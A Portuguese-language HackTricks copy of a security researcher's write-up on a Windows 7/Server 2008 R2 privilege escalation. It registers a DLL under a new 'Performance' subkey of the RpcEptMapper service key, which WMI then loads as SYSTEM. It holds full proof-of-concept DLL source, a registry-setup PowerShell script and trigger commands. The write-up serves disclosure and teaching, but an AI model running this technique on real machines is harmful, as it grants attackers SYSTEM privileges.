<details>

<summary><strong>Aprenda hacking no AWS do zero ao herói com</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Outras formas de apoiar o HackTricks:

* Se você quer ver sua **empresa anunciada no HackTricks** ou **baixar o HackTricks em PDF**, confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Adquira o [**material oficial do PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubra [**A Família PEASS**](https://opensea.io/collection/the-peass-family), nossa coleção de [**NFTs**](https://opensea.io/collection/the-peass-family) exclusivos
* **Junte-se ao grupo** 💬 [**Discord**](https://discord.gg/hRep4RUj7f) ou ao grupo [**telegram**](https://t.me/peass) ou **siga-me** no **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Compartilhe suas técnicas de hacking enviando PRs para os repositórios do** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) no github.

</details>


**Informação copiada de** [**https://itm4n.github.io/windows-registry-rpceptmapper-eop/**](https://itm4n.github.io/windows-registry-rpceptmapper-eop/)

De acordo com a saída do script, o usuário atual tem algumas permissões de escrita em duas chaves de registro:

* `HKLM\SYSTEM\CurrentControlSet\Services\Dnscache`
* `HKLM\SYSTEM\CurrentControlSet\Services\RpcEptMapper`

Vamos verificar manualmente as permissões do serviço `RpcEptMapper` usando a GUI `regedit`. Uma coisa que eu realmente gosto na janela _Configurações de Segurança Avançadas_ é a aba _Permissões Efetivas_. Você pode escolher qualquer nome de usuário ou grupo e ver imediatamente as permissões efetivas que são concedidas a esse principal sem a necessidade de inspecionar todos os ACEs separadamente. A captura de tela a seguir mostra o resultado para a conta de baixo privilégio `lab-user`.

![](https://itm4n.github.io/assets/posts/2020-11-12-windows-registry-rpceptmapper-eop/02\_regsitry-rpceptmapper-permissions.png)

A maioria das permissões são padrão (por exemplo: `Query Value`), mas uma em particular se destaca: `Create Subkey`. O nome genérico correspondente a essa permissão é `AppendData/AddSubdirectory`, que é exatamente o que foi relatado pelo script:
```
Name              : RpcEptMapper
ImagePath         : C:\Windows\system32\svchost.exe -k RPCSS
User              : NT AUTHORITY\NetworkService
ModifiablePath    : {Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\RpcEptMapper}
IdentityReference : NT AUTHORITY\Authenticated Users
Permissions       : {ReadControl, AppendData/AddSubdirectory, ReadData/ListDirectory}
Status            : Running
UserCanStart      : True
UserCanRestart    : False

Name              : RpcEptMapper
ImagePath         : C:\Windows\system32\svchost.exe -k RPCSS
User              : NT AUTHORITY\NetworkService
ModifiablePath    : {Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\RpcEptMapper}
IdentityReference : BUILTIN\Users
Permissions       : {WriteExtendedAttributes, AppendData/AddSubdirectory, ReadData/ListDirectory}
Status            : Running
UserCanStart      : True
UserCanRestart    : False
```
O que isso significa exatamente? Significa que não podemos simplesmente modificar o valor `ImagePath`, por exemplo. Para fazer isso, precisaríamos da permissão `WriteData/AddFile`. Em vez disso, só podemos criar uma nova subchave.

![](https://itm4n.github.io/assets/posts/2020-11-12-windows-registry-rpceptmapper-eop/03\_registry-imagepath-access-denied.png)

Isso significa que foi de fato um falso positivo? Certamente que não. Vamos começar a diversão!

## RTFM <a href="#rtfm" id="rtfm"></a>

Neste ponto, sabemos que podemos criar subchaves arbitrárias em `HKLM\SYSTEM\CurrentControlSet\Services\RpcEptMapper`, mas não podemos modificar subchaves e valores existentes. As subchaves já existentes são `Parameters` e `Security`, que são bastante comuns para serviços do Windows.

![](https://itm4n.github.io/assets/posts/2020-11-12-windows-registry-rpceptmapper-eop/04\_registry-rpceptmapper-config.png)

Portanto, a primeira pergunta que me veio à mente foi: _existe alguma outra subchave predefinida - como `Parameters` e `Security` - que poderíamos aproveitar para efetivamente modificar a configuração do serviço e alterar seu comportamento de alguma forma?_

Para responder a essa pergunta, meu plano inicial era enumerar todas as chaves existentes e tentar identificar um padrão. A ideia era ver quais subchaves são _significativas_ para a configuração de um serviço. Comecei a pensar em como poderia implementar isso em PowerShell e depois ordenar o resultado. No entanto, antes de fazer isso, me perguntei se essa estrutura de registro já estava documentada. Então, pesquisei algo como `windows service configuration registry site:microsoft.com` e aqui está o primeiro [resultado](https://docs.microsoft.com/en-us/windows-hardware/drivers/install/hklm-system-currentcontrolset-services-registry-tree) que apareceu.

![](https://itm4n.github.io/assets/posts/2020-11-12-windows-registry-rpceptmapper-eop/05\_google-search-registry-services.png)

Parece promissor, não é? À primeira vista, a documentação não parecia ser exaustiva e completa. Considerando o título, eu esperava ver algum tipo de estrutura de árvore detalhando todas as subchaves e valores que definem a configuração de um serviço, mas claramente não estava lá.

![](https://itm4n.github.io/assets/posts/2020-11-12-windows-registry-rpceptmapper-eop/06\_doc-registry-services.png)

Ainda assim, dei uma olhada rápida em cada parágrafo. E rapidamente identifiquei as palavras-chave "_**Performance**_" e "_**DLL**_". Sob o subtítulo "**Performance**", podemos ler o seguinte:

> **Performance**: _Uma chave que especifica informações para monitoramento opcional de desempenho. Os valores sob esta chave especificam **o nome da DLL de desempenho do driver** e **os nomes de certas funções exportadas nessa DLL**. Você pode adicionar entradas de valor a esta subchave usando entradas AddReg no arquivo INF do driver._

De acordo com este curto parágrafo, teoricamente, pode-se registrar uma DLL em um serviço de driver para monitorar seu desempenho graças à subchave `Performance`. **OK, isso é realmente interessante!** Esta chave não existe por padrão para o serviço `RpcEptMapper`, então parece ser _exatamente_ o que precisamos. Há um pequeno problema, no entanto, este serviço definitivamente não é um serviço de driver. De qualquer forma, ainda vale a pena tentar, mas precisamos de mais informações sobre esse recurso de "_Monitoramento de Desempenho_" primeiro.

![](https://itm4n.github.io/assets/posts/2020-11-12-windows-registry-rpceptmapper-eop/07\_sc-qc-rpceptmapper.png)

> **Nota:** no Windows, cada serviço tem um `Type` dado. Um tipo de serviço pode ser um dos seguintes valores: `SERVICE_KERNEL_DRIVER (1)`, `SERVICE_FILE_SYSTEM_DRIVER (2)`, `SERVICE_ADAPTER (4)`, `SERVICE_RECOGNIZER_DRIVER (8)`, `SERVICE_WIN32_OWN_PROCESS (16)`, `SERVICE_WIN32_SHARE_PROCESS (32)` ou `SERVICE_INTERACTIVE_PROCESS (256)`.

Após algumas pesquisas no Google, encontrei este recurso na documentação: [Criando a Chave de Desempenho da Aplicação](https://docs.microsoft.com/en-us/windows/win32/perfctrs/creating-the-applications-performance-key).

![](https://itm4n.github.io/assets/posts/2020-11-12-windows-registry-rpceptmapper-eop/08\_performance-subkey-documentation.png)

Primeiro, há uma bela estrutura de árvore que lista todas as chaves e valores que temos que criar. Em seguida, a descrição fornece as seguintes informações chave:

* O valor `Library` pode conter **um nome de DLL ou um caminho completo para uma DLL**.
* Os valores `Open`, `Collect` e `Close` permitem especificar **os nomes das funções** que devem ser exportadas pela DLL.
* O tipo de dados desses valores é `REG_SZ` (ou até `REG_EXPAND_SZ` para o valor `Library`).

Se você seguir os links incluídos neste recurso, até encontrará o protótipo dessas funções junto com alguns exemplos de código: [Implementando OpenPerformanceData](https://docs.microsoft.com/en-us/windows/win32/perfctrs/implementing-openperformancedata).
```
DWORD APIENTRY OpenPerfData(LPWSTR pContext);
DWORD APIENTRY CollectPerfData(LPWSTR pQuery, PVOID* ppData, LPDWORD pcbData, LPDWORD pObjectsReturned);
DWORD APIENTRY ClosePerfData();
```
## Escrevendo um Prova de Conceito <a href="#writing-a-proof-of-concept" id="writing-a-proof-of-concept"></a>

Graças a todos os fragmentos que consegui coletar ao longo da documentação, escrever uma DLL simples de Prova de Conceito deve ser bastante direto. Mas ainda assim, precisamos de um plano!

Quando preciso explorar algum tipo de vulnerabilidade de hijacking de DLL, geralmente começo com uma função auxiliar de log simples e personalizada. O propósito desta função é escrever algumas informações-chave em um arquivo sempre que for invocada. Normalmente, registro o PID do processo atual e do processo pai, o nome do usuário que executa o processo e a linha de comando correspondente. Também registro o nome da função que desencadeou esse evento de log. Dessa forma, sei qual parte do código foi executada.

Nos meus outros artigos, sempre pulei a parte de desenvolvimento porque assumi que era mais ou menos óbvio. Mas, também quero que meus posts no blog sejam amigáveis para iniciantes, então há uma contradição. Vou remediar essa situação aqui detalhando o processo. Então, vamos iniciar o Visual Studio e criar um novo projeto "_C++ Console App_". Note que eu poderia ter criado um projeto "_Dynamic-Link Library (DLL)_" mas acho na verdade mais fácil começar com um aplicativo de console.

Aqui está o código inicial gerado pelo Visual Studio:
```c
#include <iostream>

int main()
{
std::cout << "Hello World!\n";
}
```
Claro, isso não é o que queremos. Queremos criar uma DLL, não um EXE, então temos que substituir a função `main` por `DllMain`. Você pode encontrar um código esqueleto para esta função na documentação: [Inicializar uma DLL](https://docs.microsoft.com/en-us/cpp/build/run-time-library-behavior#initialize-a-dll).
```c
#include <Windows.h>

extern "C" BOOL WINAPI DllMain(HINSTANCE const instance, DWORD const reason, LPVOID const reserved)
{
switch (reason)
{
case DLL_PROCESS_ATTACH:
Log(L"DllMain"); // See log helper function below
break;
case DLL_THREAD_ATTACH:
break;
case DLL_THREAD_DETACH:
break;
case DLL_PROCESS_DETACH:
break;
}
return TRUE;
}
```
Em paralelo, também precisamos alterar as configurações do projeto para especificar que o arquivo compilado de saída deve ser uma DLL em vez de um EXE. Para fazer isso, você pode abrir as propriedades do projeto e, na seção "**General**", selecionar "**Dynamic Library (.dll)**" como o "**Configuration Type**". Logo abaixo da barra de título, você também pode selecionar "**All Configurations**" e "**All Platforms**" para que essa configuração seja aplicada globalmente.

Em seguida, adiciono minha função de ajuda de log personalizada.
```c
#include <Lmcons.h> // UNLEN + GetUserName
#include <tlhelp32.h> // CreateToolhelp32Snapshot()
#include <strsafe.h>

void Log(LPCWSTR pwszCallingFrom)
{
LPWSTR pwszBuffer, pwszCommandLine;
WCHAR wszUsername[UNLEN + 1] = { 0 };
SYSTEMTIME st = { 0 };
HANDLE hToolhelpSnapshot;
PROCESSENTRY32 stProcessEntry = { 0 };
DWORD dwPcbBuffer = UNLEN, dwBytesWritten = 0, dwProcessId = 0, dwParentProcessId = 0, dwBufSize = 0;
BOOL bResult = FALSE;

// Get the command line of the current process
pwszCommandLine = GetCommandLine();

// Get the name of the process owner
GetUserName(wszUsername, &dwPcbBuffer);

// Get the PID of the current process
dwProcessId = GetCurrentProcessId();

// Get the PID of the parent process
hToolhelpSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
stProcessEntry.dwSize = sizeof(PROCESSENTRY32);
if (Process32First(hToolhelpSnapshot, &stProcessEntry)) {
do {
if (stProcessEntry.th32ProcessID == dwProcessId) {
dwParentProcessId = stProcessEntry.th32ParentProcessID;
break;
}
} while (Process32Next(hToolhelpSnapshot, &stProcessEntry));
}
CloseHandle(hToolhelpSnapshot);

// Get the current date and time
GetLocalTime(&st);

// Prepare the output string and log the result
dwBufSize = 4096 * sizeof(WCHAR);
pwszBuffer = (LPWSTR)malloc(dwBufSize);
if (pwszBuffer)
{
StringCchPrintf(pwszBuffer, dwBufSize, L"[%.2u:%.2u:%.2u] - PID=%d - PPID=%d - USER='%s' - CMD='%s' - METHOD='%s'\r\n",
st.wHour,
st.wMinute,
st.wSecond,
dwProcessId,
dwParentProcessId,
wszUsername,
pwszCommandLine,
pwszCallingFrom
);

LogToFile(L"C:\\LOGS\\RpcEptMapperPoc.log", pwszBuffer);

free(pwszBuffer);
}
}
```
Então, podemos preencher a DLL com as três funções que vimos na documentação. A documentação também afirma que elas devem retornar `ERROR_SUCCESS` se forem bem-sucedidas.
```c
DWORD APIENTRY OpenPerfData(LPWSTR pContext)
{
Log(L"OpenPerfData");
return ERROR_SUCCESS;
}

DWORD APIENTRY CollectPerfData(LPWSTR pQuery, PVOID* ppData, LPDWORD pcbData, LPDWORD pObjectsReturned)
{
Log(L"CollectPerfData");
return ERROR_SUCCESS;
}

DWORD APIENTRY ClosePerfData()
{
Log(L"ClosePerfData");
return ERROR_SUCCESS;
}
```
```markdown
Ok, o projeto agora está devidamente configurado, `DllMain` está implementado, temos uma função auxiliar de log e as três funções necessárias. No entanto, falta uma última coisa. Se compilarmos este código, `OpenPerfData`, `CollectPerfData` e `ClosePerfData` estarão disponíveis apenas como funções internas, então precisamos **exportá-las**. Isso pode ser alcançado de várias maneiras. Por exemplo, você poderia criar um arquivo [DEF](https://docs.microsoft.com/en-us/cpp/build/exporting-from-a-dll-using-def-files) e depois configurar o projeto adequadamente. No entanto, prefiro usar a palavra-chave `__declspec(dllexport)` ([doc](https://docs.microsoft.com/en-us/cpp/build/exporting-from-a-dll-using-declspec-dllexport)), especialmente para um projeto pequeno como este. Dessa forma, só temos que declarar as três funções no início do código-fonte.
```
```c
extern "C" __declspec(dllexport) DWORD APIENTRY OpenPerfData(LPWSTR pContext);
extern "C" __declspec(dllexport) DWORD APIENTRY CollectPerfData(LPWSTR pQuery, PVOID* ppData, LPDWORD pcbData, LPDWORD pObjectsReturned);
extern "C" __declspec(dllexport) DWORD APIENTRY ClosePerfData();
```
Se você quiser ver o código completo, eu o enviei [aqui](https://gist.github.com/itm4n/253c5937f9b3408b390d51ac068a4d12).

Finalmente, podemos selecionar _**Release/x64**_ e "_**Compilar a solução**_". Isso produzirá nosso arquivo DLL: `.\DllRpcEndpointMapperPoc\x64\Release\DllRpcEndpointMapperPoc.dll`.

## Testando o PoC <a href="#testing-the-poc" id="testing-the-poc"></a>

Antes de prosseguir, eu sempre me certifico de que meu payload está funcionando corretamente, testando-o separadamente. O pouco tempo gasto aqui pode economizar muito tempo depois, evitando que você entre em um beco sem saída durante uma hipotética fase de depuração. Para fazer isso, podemos simplesmente usar `rundll32.exe` e passar o nome da DLL e o nome de uma função exportada como parâmetros.
```
C:\Users\lab-user\Downloads\>rundll32 DllRpcEndpointMapperPoc.dll,OpenPerfData
```
Ótimo, o arquivo de log foi criado e, se o abrirmos, podemos ver duas entradas. A primeira foi escrita quando a DLL foi carregada pelo `rundll32.exe`. A segunda foi escrita quando `OpenPerfData` foi chamado. Parece bom! ![:slightly_smiling_face:](https://github.githubassets.com/images/icons/emoji/unicode/1f642.png)
```
[21:25:34] - PID=3040 - PPID=2964 - USER='lab-user' - CMD='rundll32  DllRpcEndpointMapperPoc.dll,OpenPerfData' - METHOD='DllMain'
[21:25:34] - PID=3040 - PPID=2964 - USER='lab-user' - CMD='rundll32  DllRpcEndpointMapperPoc.dll,OpenPerfData' - METHOD='OpenPerfData'
```
Agora, podemos nos concentrar na vulnerabilidade em si e começar criando a chave de registro e os valores necessários. Podemos fazer isso manualmente usando `reg.exe` / `regedit.exe` ou programaticamente com um script. Como já passei pelos passos manuais durante minha pesquisa inicial, mostrarei uma maneira mais limpa de fazer a mesma coisa com um script PowerShell. Além disso, criar chaves e valores de registro no PowerShell é tão fácil quanto chamar `New-Item` e `New-ItemProperty`, não é mesmo? ![:thinking:](https://github.githubassets.com/images/icons/emoji/unicode/1f914.png)

![](https://itm4n.github.io/assets/posts/2020-11-12-windows-registry-rpceptmapper-eop/10\_powershell-new-item-access-denied.png)

`O acesso solicitado ao registro não é permitido`… Hmm, ok… Parece que não será tão fácil, afinal de contas. ![:stuck\_out\_tongue:](https://github.githubassets.com/images/icons/emoji/unicode/1f61b.png)

Eu não investiguei realmente esse problema, mas meu palpite é que, quando chamamos `New-Item`, o `powershell.exe` na verdade tenta abrir a chave de registro pai com algumas flags que correspondem a permissões que não temos.

De qualquer forma, se os cmdlets integrados não fizerem o trabalho, podemos sempre descer um nível e invocar funções DotNet diretamente. De fato, chaves de registro também podem ser criadas com o seguinte código no PowerShell.
```
[Microsoft.Win32.Registry]::LocalMachine.CreateSubKey("SYSTEM\CurrentControlSet\Services\RpcEptMapper\Performance")
```
```markdown
Aqui vamos nós! No final, montei o seguinte script para criar a chave e os valores apropriados, aguardar a entrada do usuário e, finalmente, terminar limpando tudo.
```
```
$ServiceKey = "SYSTEM\CurrentControlSet\Services\RpcEptMapper\Performance"

Write-Host "[*] Create 'Performance' subkey"
[void] [Microsoft.Win32.Registry]::LocalMachine.CreateSubKey($ServiceKey)
Write-Host "[*] Create 'Library' value"
New-ItemProperty -Path "HKLM:$($ServiceKey)" -Name "Library" -Value "$($pwd)\DllRpcEndpointMapperPoc.dll" -PropertyType "String" -Force | Out-Null
Write-Host "[*] Create 'Open' value"
New-ItemProperty -Path "HKLM:$($ServiceKey)" -Name "Open" -Value "OpenPerfData" -PropertyType "String" -Force | Out-Null
Write-Host "[*] Create 'Collect' value"
New-ItemProperty -Path "HKLM:$($ServiceKey)" -Name "Collect" -Value "CollectPerfData" -PropertyType "String" -Force | Out-Null
Write-Host "[*] Create 'Close' value"
New-ItemProperty -Path "HKLM:$($ServiceKey)" -Name "Close" -Value "ClosePerfData" -PropertyType "String" -Force | Out-Null

Read-Host -Prompt "Press any key to continue"

Write-Host "[*] Cleanup"
Remove-ItemProperty -Path "HKLM:$($ServiceKey)" -Name "Library" -Force
Remove-ItemProperty -Path "HKLM:$($ServiceKey)" -Name "Open" -Force
Remove-ItemProperty -Path "HKLM:$($ServiceKey)" -Name "Collect" -Force
Remove-ItemProperty -Path "HKLM:$($ServiceKey)" -Name "Close" -Force
[Microsoft.Win32.Registry]::LocalMachine.DeleteSubKey($ServiceKey)
```
O último passo agora, **como enganamos o serviço RPC Endpoint Mapper para carregar nossa DLL de Performance?** Infelizmente, não acompanhei todas as diferentes coisas que tentei. Teria sido realmente interessante, no contexto deste post do blog, destacar como a pesquisa pode ser às vezes tediosa e demorada. De qualquer forma, uma coisa que descobri ao longo do caminho é que você pode consultar _Contadores de Desempenho_ usando WMI (_Windows Management Instrumentation_), o que não é tão surpreendente afinal. Mais informações aqui: [_Tipos de Contador de Desempenho WMI_](https://docs.microsoft.com/en-us/windows/win32/wmisdk/wmi-performance-counter-types).

> _Os tipos de contadores aparecem como o qualificador CounterType para propriedades nas classes_ [_Win32\_PerfRawData_](https://docs.microsoft.com/en-us/windows/win32/cimwin32prov/win32-perfrawdata) _, e como o qualificador CookingType para propriedades nas classes_ [_Win32\_PerfFormattedData_](https://docs.microsoft.com/en-us/windows/win32/cimwin32prov/win32-perfformatteddata) _._

Então, primeiramente enumerei as classes WMI relacionadas a _Dados de Desempenho_ no PowerShell usando o seguinte comando.
```
Get-WmiObject -List | Where-Object { $_.Name -Like "Win32_Perf*" }
```
E, vi que meu arquivo de log foi criado quase imediatamente! Aqui está o conteúdo do arquivo.
```
[21:17:49] - PID=4904 - PPID=664 - USER='SYSTEM' - CMD='C:\Windows\system32\wbem\wmiprvse.exe' - METHOD='DllMain'
[21:17:49] - PID=4904 - PPID=664 - USER='SYSTEM' - CMD='C:\Windows\system32\wbem\wmiprvse.exe' - METHOD='OpenPerfData'
[21:17:49] - PID=4904 - PPID=664 - USER='SYSTEM' - CMD='C:\Windows\system32\wbem\wmiprvse.exe' - METHOD='CollectPerfData'
[21:17:49] - PID=4904 - PPID=664 - USER='SYSTEM' - CMD='C:\Windows\system32\wbem\wmiprvse.exe' - METHOD='CollectPerfData'
[21:17:49] - PID=4904 - PPID=664 - USER='SYSTEM' - CMD='C:\Windows\system32\wbem\wmiprvse.exe' - METHOD='CollectPerfData'
[21:17:49] - PID=4904 - PPID=664 - USER='SYSTEM' - CMD='C:\Windows\system32\wbem\wmiprvse.exe' - METHOD='CollectPerfData'
[21:17:49] - PID=4904 - PPID=664 - USER='SYSTEM' - CMD='C:\Windows\system32\wbem\wmiprvse.exe' - METHOD='CollectPerfData'
[21:17:49] - PID=4904 - PPID=664 - USER='SYSTEM' - CMD='C:\Windows\system32\wbem\wmiprvse.exe' - METHOD='CollectPerfData'
[21:17:49] - PID=4904 - PPID=664 - USER='SYSTEM' - CMD='C:\Windows\system32\wbem\wmiprvse.exe' - METHOD='CollectPerfData'
[21:17:49] - PID=4904 - PPID=664 - USER='SYSTEM' - CMD='C:\Windows\system32\wbem\wmiprvse.exe' - METHOD='CollectPerfData'
[21:17:49] - PID=4904 - PPID=664 - USER='SYSTEM' - CMD='C:\Windows\system32\wbem\wmiprvse.exe' - METHOD='CollectPerfData'
[21:17:49] - PID=4904 - PPID=664 - USER='SYSTEM' - CMD='C:\Windows\system32\wbem\wmiprvse.exe' - METHOD='CollectPerfData'
[21:17:49] - PID=4904 - PPID=664 - USER='SYSTEM' - CMD='C:\Windows\system32\wbem\wmiprvse.exe' - METHOD='CollectPerfData'
```
Esperava conseguir execução arbitrária de código como `NETWORK SERVICE` no contexto do serviço `RpcEptMapper` no máximo, mas parece que obtive um resultado muito melhor do que o antecipado. Na verdade, consegui execução arbitrária de código no contexto do próprio serviço `WMI`, que é executado como `LOCAL SYSTEM`. Incrível, não é?! ![:sunglasses:](https://github.githubassets.com/images/icons/emoji/unicode/1f60e.png)

> **Nota:** se eu tivesse conseguido execução arbitrária de código como `NETWORK SERVICE`, estaria apenas a um token de distância da conta `LOCAL SYSTEM` graças ao truque que foi demonstrado por James Forshaw alguns meses atrás neste post do blog: [Sharing a Logon Session a Little Too Much](https://www.tiraniddo.dev/2020/04/sharing-logon-session-little-too-much.html).

Também tentei obter cada classe WMI separadamente e observei exatamente o mesmo resultado.
```
Get-WmiObject Win32_Perf
Get-WmiObject Win32_PerfRawData
Get-WmiObject Win32_PerfFormattedData
```
## Conclusão <a href="#conclusion" id="conclusion"></a>

Não sei como essa vulnerabilidade passou despercebida por tanto tempo. Uma explicação é que outras ferramentas provavelmente procuravam por acesso total de escrita no registro, enquanto que `AppendData/AddSubdirectory` era na verdade suficiente neste caso. Quanto à "má configuração" em si, eu assumiria que a chave de registro foi definida dessa maneira por um propósito específico, embora eu não consiga pensar em um cenário concreto no qual os usuários teriam qualquer tipo de permissão para modificar a configuração de um serviço.

Decidi escrever sobre essa vulnerabilidade publicamente por dois motivos. O primeiro é que eu a tornei pública - sem inicialmente perceber - no dia em que atualizei meu script PrivescCheck com a função `GetModfiableRegistryPath`, o que foi há vários meses. O segundo é que o impacto é baixo. Requer acesso local e afeta apenas versões antigas do Windows que não são mais suportadas (a menos que você tenha comprado o Suporte Estendido...). Neste ponto, se você ainda está usando Windows 7 / Server 2008 R2 sem isolar essas máquinas adequadamente na rede primeiro, então impedir que um atacante obtenha privilégios de SYSTEM é provavelmente o menor dos seus problemas.

Além do lado anedótico dessa vulnerabilidade de escalonamento de privilégios, acho que essa configuração de registro "Perfomance" abre oportunidades realmente interessantes para pós-exploração, movimento lateral e evasão de AV/EDR. Já tenho alguns cenários particulares em mente, mas ainda não testei nenhum deles. Continuará?...

<details>

<summary><strong>Aprenda hacking no AWS do zero ao herói com</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Outras formas de apoiar o HackTricks:

* Se você quer ver sua **empresa anunciada no HackTricks** ou **baixar o HackTricks em PDF**, confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Adquira o [**material oficial PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubra [**A Família PEASS**](https://opensea.io/collection/the-peass-family), nossa coleção de [**NFTs**](https://opensea.io/collection/the-peass-family) exclusivos
* **Junte-se ao grupo** 💬 [**Discord**](https://discord.gg/hRep4RUj7f) ou ao grupo [**telegram**](https://t.me/peass) ou **siga**-me no **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Compartilhe suas dicas de hacking enviando PRs para os repositórios github** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
